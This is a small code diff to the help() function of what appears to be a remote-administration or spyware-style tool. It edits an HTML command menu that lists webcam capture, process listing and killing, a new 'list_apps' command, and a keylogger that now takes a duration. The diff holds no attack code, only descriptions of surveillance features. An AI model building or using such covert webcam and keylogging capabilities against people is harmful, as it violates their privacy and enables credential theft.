@@ -31,6 +31,10 @@ def help():
                     <td style="padding: 5px;">Take a photo from webcam</td>
                 </tr>
                 <tr>
+                    <td style="padding: 5px;">list_apps</td>
+                    <td style="padding: 5px;">See running apps</td>
+                </tr>
+                <tr>
                     <td style="padding: 5px;">list_processes</td>
                     <td style="padding: 5px;">List all running processes</td>
                 </tr>
@@ -39,8 +43,8 @@ def help():
                     <td style="padding: 5px;">Kill process with given pid</td>
                 </tr>
                 <tr>
-                    <td style="padding: 5px;">keylog</td>
-                    <td style="padding: 5px;">Start keylogger</td>
+                    <td style="padding: 5px;">keylog &lt;duration&gt; </td>
+                    <td style="padding: 5px;">Start keylog</td>
                 </tr>
             </table>
             </td>
